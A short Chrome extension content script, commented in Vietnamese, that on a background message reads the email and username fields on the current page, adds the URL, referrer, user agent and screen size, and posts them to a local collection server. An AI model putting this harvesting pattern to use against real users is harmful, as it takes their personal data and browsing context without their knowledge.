// Hàm để gửi dữ liệu đến server
function sendDataToServer(data) {
    fetch('http://localhost:8000/collect', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    })
    .then(response => response.json())
    .then(data => console.log('Data sent successfully:', data))
    .catch((error) => console.error('Error:', error));
  }

// Lắng nghe tin nhắn từ background script
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.action === "collectUserData") {
      // Thu thập thông tin người dùng (giả sử sử dụng dữ liệu từ DOM)
      const userData = {
        date: new Date().toISOString(),
        url: window.location.href,
        email: document.querySelector('input[name="email"]')?.value || 'unknown',
        username: document.querySelector('input[name="username"]')?.value || 'unknown',
        // Thu thập thêm thông tin từ trang web nếu cần
        userAgent: navigator.userAgent,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        referrer: document.referrer,
      };
  
      // Gửi dữ liệu đến server
      sendDataToServer(userData);
    }
});
